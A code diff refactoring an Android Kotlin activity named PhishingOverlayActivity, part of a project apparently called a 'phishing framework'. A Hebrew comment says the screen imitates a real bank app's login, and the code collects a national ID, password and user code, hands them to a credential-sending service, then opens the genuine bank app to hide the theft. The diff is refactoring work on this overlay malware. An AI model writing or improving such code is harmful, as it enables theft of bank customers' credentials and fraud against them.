@@ -1,4 +1,4 @@
-package com.example.phishingframework
+package com.example.phishingframework.activities
 
 import android.app.Activity
 import android.content.BroadcastReceiver
@@ -16,6 +16,10 @@ import android.widget.EditText
 import android.widget.TextView
 import android.widget.Toast
 import androidx.core.content.ContextCompat
+import com.example.phishingframework.R
+import com.example.phishingframework.services.CredentialSendService
+import com.example.phishingframework.utils.Constants
+import com.example.phishingframework.utils.ValidationUtils
 import java.util.*
 
 //חיקוי מסך התחברות - מציגה ממשק זהה לאפליקציית הבנק האמיתית
@@ -77,7 +81,7 @@ class PhishingOverlayActivity : Activity() {
         resultReceiver = object : BroadcastReceiver() {
             override fun onReceive(context: Context, intent: Intent) {
                 when (intent.action) {
-                    CredentialSendService.ACTION_CREDENTIALS_OK -> {
+                    Constants.ACTION_CREDENTIALS_OK -> {
                         Log.i("PhishingOverlay", "Credentials sent successfully")
 
                         // פותחים את האפליקציה האמיתית
@@ -92,7 +96,7 @@ class PhishingOverlayActivity : Activity() {
                         finish()
                     }
 
-                    CredentialSendService.ACTION_CREDENTIALS_FAILED -> {
+                    Constants.ACTION_CREDENTIALS_FAILED -> {
                         Toast.makeText(
                             this@PhishingOverlayActivity,
                             "שליחת הפרטים נכשלה. אנא נסה שוב.",
@@ -104,8 +108,8 @@ class PhishingOverlayActivity : Activity() {
         }
 
         val filter = IntentFilter().apply {
-            addAction(CredentialSendService.ACTION_CREDENTIALS_OK)
-            addAction(CredentialSendService.ACTION_CREDENTIALS_FAILED)
+            addAction(Constants.ACTION_CREDENTIALS_OK)
+            addAction(Constants.ACTION_CREDENTIALS_FAILED)
         }
 
         ContextCompat.registerReceiver(
@@ -118,7 +122,7 @@ class PhishingOverlayActivity : Activity() {
         // לחיצה על כפתור הכניסה
         loginButton.setOnClickListener {
             // ולידציה
-            if (!validateAndMarkErrors(idField, passwordField, codeField)) {
+            if (!ValidationUtils.validateAndMarkErrors(idField, passwordField, codeField)) {
                 return@setOnClickListener
             }
 
@@ -142,31 +146,6 @@ class PhishingOverlayActivity : Activity() {
 
         // פוקוס על שדה ת"ז
         idField.requestFocus()
-    }
-
-    private fun validateAndMarkErrors(
-        idField: EditText,
-        passField: EditText,
-        codeField: EditText
-    ): Boolean {
-        var allOk = true
-
-        if (!ID_REGEX.matches(idField.text)) {
-            idField.error = "ת״ז חייבת להכיל 9 ספרות"
-            allOk = false
-        }
-
-        if (passField.text.length < 6) {
-            passField.error = "סיסמה חייבת להכיל לפחות 6 תווים"
-            allOk = false
-        }
-
-        if (!CODE_REGEX.matches(codeField.text)) {
-            codeField.error = "קוד: 2 אותיות גדולות + 4 ספרות (AA1234)"
-            allOk = false
-        }
-
-        return allOk
     }
 
     private fun setDynamicGreeting() {
